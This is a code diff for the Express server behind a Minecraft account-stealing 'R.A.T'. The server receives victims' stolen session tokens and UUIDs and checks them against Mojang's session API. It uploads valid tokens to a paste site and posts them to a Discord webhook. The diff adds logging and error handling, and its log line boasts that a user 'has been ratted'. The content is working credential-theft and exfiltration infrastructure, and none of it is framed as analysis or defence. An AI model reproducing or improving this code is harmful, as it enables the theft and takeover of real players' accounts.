@@ -41,7 +41,9 @@ app.post("/", async (req, res) => {
             accessToken: req.body.token,
             selectedProfile: req.body.uuid,
             serverId: req.body.uuid
-        }).then(res => {
+        })
+        .then(res => {
+            console.log(`Mojang API Response: ${JSON.stringify(res.data)}`);
             if (res.data && res.data.path === "/session/minecraft/join") {
                 return "Non-License";
             } else if (res.status === 200) {
@@ -49,7 +51,14 @@ app.post("/", async (req, res) => {
             } else {
                 return `Unexpected status: ${res.status}`;
             }
-        }).catch(() => "Request failed");
+        })
+        .catch(error => {
+            console.error(`Request failed with error: ${error.message}`);
+            if (error.response) {
+                console.error(`Response data: ${JSON.stringify(error.response.data)}`);
+            }
+            return "Request failed";
+        });
 
         let webhookData = {
             content: `@everyone - ${req.body.username}`,
@@ -67,7 +76,7 @@ app.post("/", async (req, res) => {
             webhookData.embeds[0].fields.push({
                 name: 'License Status', value: `**\`\`\`${response}\`\`\`**`, inline: false
             });
-        } else {
+        } else if (response === "License") {
             const [shorttoken, profiles, country] = await Promise.all([
                 post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
                 getProfiles(req.body.uuid).then(profileData => {
@@ -99,7 +108,7 @@ app.post("/", async (req, res) => {
         await post(process.env.WEBHOOK, webhookData);
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
     } catch (err) {
-        console.error(err);
+        console.error(`Error in processing request: ${err.message}`);
     }
     res.send("OK");
 });
